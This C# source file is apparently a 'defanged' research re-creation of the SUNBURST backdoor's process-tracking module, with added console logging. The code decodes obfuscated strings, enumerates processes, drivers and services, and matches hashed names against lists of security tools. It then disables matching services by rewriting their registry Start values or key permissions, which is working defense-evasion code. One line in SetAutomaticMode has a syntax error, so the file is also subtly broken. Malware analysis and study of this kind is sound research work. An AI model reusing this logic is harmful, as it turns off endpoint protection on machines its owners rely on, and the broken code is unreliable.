using System;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using System.Management;
using System.Diagnostics;

namespace SunBurstDefanged
{
	public static class ProcessTracker
	{
		private static readonly object _lock = new object();

		private static bool SearchConfigurations()
		{
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Entering SearchConfigurations()");
			// Select * From Win32_SystemDriver
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Search Configurations: " + ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA=="));
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA==")))
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					// PathName
					ulong hash = Utilities.GetHash(Path.GetFileName(((ManagementObject)managementBaseObject).Properties[ZipHelper.Unzip("C0gsyfBLzE0FAA==")].Value.ToString()).ToLower());

					if (!Settings.printy)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Checking property: " + ZipHelper.Unzip("C0gsyfBLzE0FAA==") + "  GetFileName: " + Path.GetFileName(((ManagementObject)managementBaseObject).Properties[ZipHelper.Unzip("C0gsyfBLzE0FAA==")].Value.ToString()));
					}
					if ((Array.IndexOf<ulong>(Settings.configTimeStamps, hash) != -1))
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Check for special drivers failed . Backdoor ConfigTimeStamps detected last GetFileName with hash " + hash + " [Use -r to Bypass]");
						if (Settings.bypassr)
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Because you are bypassing drivers/process check, the backdoor will continue. In a normal case teh backdoor stop execution. ");
						}
						else
						{
							return true;
						}
					}
				}
			}
			return false;
		}

		private static bool SearchAssemblies(Process[] processes)
		{
			for (int i = 0; i < processes.Length; i++)
			{
				ulong hash = Utilities.GetHash(processes[i].ProcessName.ToLower());

				if (!Settings.printp)
				{
					Console.WriteLine("         - Assembly/Process: " + processes[i].ProcessName);
				}
				if (Array.IndexOf<ulong>(Settings.assemblyTimeStamps, hash) != -1)
				{
					Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Interesting assembly found:" + processes[i].ProcessName + "[-r to Bypass]");
					if (Settings.bypassr)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Because you are bypassing drivers/process check, the backdoor will continue. In a normal case the backdoor stop execution. ");
					}
					else
					{
						return true;
					}
				}
			}
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Searching processes completed.");
			return false;
		}

		private static bool SearchServices(Process[] processes)
		{
			for (int i = 0; i < processes.Length; i++)
			{
				ulong hash = Utilities.GetHash(processes[i].ProcessName.ToLower());

				if (!Settings.printi)
				{
					Console.WriteLine("         - Searching Services: " + processes[i].ProcessName);
				}
				foreach (ServiceConfiguration serviceConfiguration in Settings.svcList)
				{
					if (Array.IndexOf<ulong>(serviceConfiguration.timeStamps, hash) != -1)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Interesting process found:" + processes[i].ProcessName.ToLower());
						object @lock = ProcessTracker._lock;
						lock (@lock)
						{
							if (!serviceConfiguration.running)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Service appears not to be running");
								Settings.svcListModified1 = true;
								Settings.svcListModified2 = true;
								serviceConfiguration.running = true;
							}
							if (!serviceConfiguration.disabled && !serviceConfiguration.stopped && serviceConfiguration.Svc.Length != 0)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Setting service to manual then disable and stop it.");
								Utilities.DelayMin(0, 0);
								ProcessTracker.SetManualMode(serviceConfiguration.Svc);
								serviceConfiguration.disabled = true;
								serviceConfiguration.stopped = true;
							}
						}
					}
				}
			}
			if (Settings.svcList.Any((ServiceConfiguration a) => a.disabled))
			{
				ConfigManager.WriteServiceStatus();
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Write service status.");
				return true;
			}

			return false;
		}

		public static bool TrackProcesses(bool full)
		{
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Ready to start getting system processes");
			Process[] processes = Process.GetProcesses();
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - List of processes obtained");
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Ready to start searching processes");
			if (ProcessTracker.SearchAssemblies(processes))
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - SearchAssemblies in TrackProcesses() returning true");
				return true;
			}
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Ready to start searching Services");
			bool flag = ProcessTracker.SearchServices(processes);
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Services search completed");
			if ((!flag && full) || Settings.forceu)
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Searching configurations");
				return ProcessTracker.SearchConfigurations();
			}
			return flag;
		}

		private static bool SetManualMode(ServiceConfiguration.Service[] svcList)
		{
			try
			{
				// SYSTEM\CurrentControlSet\services
				bool result = false;
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZipHelper.Unzip("C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=")))
				{
					foreach (string text in registryKey.GetSubKeyNames())
					{
						foreach (ServiceConfiguration.Service service in svcList)
						{
							try
							{
								if (Utilities.GetHash(text.ToLower()) == service.timeStamp)
								{
									Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Interesting Service found " + text);
									if (service.started)
									{
										Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Service is started " + text + " setting " + registryKey + "to false");
										result = true;
										RegistryHelper.SetKeyPermissions(registryKey, text, false);
									}
									else
									{
										using (RegistryKey registryKey2 = registryKey.OpenSubKey(text, true))
										{
											// Start
											if (registryKey2.GetValueNames().Contains(ZipHelper.Unzip("Cy5JLCoBAA==")))
											{
												Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Setting " + text + " with value " + ZipHelper.Unzip("Cy5JLCoBAA=="));
												// Start
												registryKey2.SetValue(ZipHelper.Unzip("Cy5JLCoBAA=="), 4, RegistryValueKind.DWord);
												result = true;
											}
										}
									}
								}
							}
							catch (Exception)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Error in SetManualMode");
							}
						}
					}
				}
				return result;
			}
			catch (Exception)
			{
			}
			return false;
		}

		public static void SetAutomaticMode()
		{
			try
			{
				// SYSTEM\CurrentControlSet\services
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZipHelper.Unzip("C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=")))
				{
					foreach (string text in registryKey.GetSubKeyNames())
					{
						foreach (ServiceConfiguration serviceConfiguration in Settings.svcList)
						{
							if (serviceConfiguration.stopped)
							{
								foreach (ServiceConfiguration.Service service in serviceConfiguration.Svc)
								{
									try
									{
										if (Utilities.GetHash(text.ToLower()) == service.timeStamp)
										{
											if (service.started)
											{
												RegistryHelper.SetKeyPermissions(registryKey, text, true);
											}
											else
											{
												using (RegistryKey registryKey2 = registryKey.OpenSubKey(text, true))
												{
													if (registryKey2.GetValueNames().Contains("Start"))
													{
														registryKey2.SetValue("Start"), service.DefaultValue, RegistryValueKind.DWord);
													}
												}
											}
										}
									}
									catch (Exception)
									{
									}
								}
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
